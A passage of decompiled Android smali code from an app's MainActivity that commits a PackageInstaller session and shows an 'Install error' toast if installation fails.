    .line 166
    .line 167
    move-result-object v1

    .line 168
    invoke-virtual {v1}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    .line 169
    .line 170
    .line 171
    move-result-object v1

    .line 172
    invoke-virtual {v5, v1}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V

    .line 173
    .line 174
    .line 175
    invoke-virtual {v5}, Landroid/content/pm/PackageInstaller$Session;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 176
    .line 177
    .line 178
    return-void

    .line 179
    :catch_0
    iput-boolean v2, p0, Lcom/mart/updatenow/MainActivity;->E:Z

    .line 180
    .line 181
    const-string v1, "Install error"

    .line 182
    .line 183
    invoke-static {p0, v1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 184
    .line 185
    .line 186
    move-result-object v0

    .line 187
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 188
    .line 189
    .line 190
    return-void
.end method
